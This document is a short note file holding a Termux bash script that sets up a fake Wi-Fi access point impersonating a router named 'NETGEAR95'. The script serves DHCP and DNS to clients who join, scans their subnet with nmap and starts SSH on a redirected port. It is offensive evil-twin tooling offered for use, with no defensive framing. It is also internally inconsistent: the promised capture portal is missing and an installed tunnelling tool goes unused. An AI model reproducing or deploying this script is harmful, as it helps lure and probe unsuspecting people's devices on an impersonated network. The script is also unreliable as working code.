---
created: 2025-07-19T09:35:22-04:00
updated: 2025-07-19T09:35:54-04:00
---

# Capture Portal

#!/data/data/com.termux/files/usr/bin/bash

# Update and install required packages
pkg update && pkg upgrade -y
pkg install -y hostapd dnsmasq openssh nmap python procps dns2tcp

# Create hostapd configuration
cat <<EOF > ~/hostapd.conf
interface=wlan0
driver=nl80211
ssid=NETGEAR95
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=yourpassword
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

# Create dnsmasq configuration
cat <<EOF > ~/dnsmasq.conf
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.50,255.255.255.0,12h
address=/gateway/10.0.0.1
address=/dns/10.0.0.1
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
listen-address=10.0.0.1
EOF

# Start services
hostapd ~/hostapd.conf &
dnsmasq -C ~/dnsmasq.conf &
ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa -N ''
sshd
nmap -sn 10.0.0.0/24

# Redirect SSH port
iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
sshd -p 2222

echo "Fake NETGEAR95 access point set up successfully!"
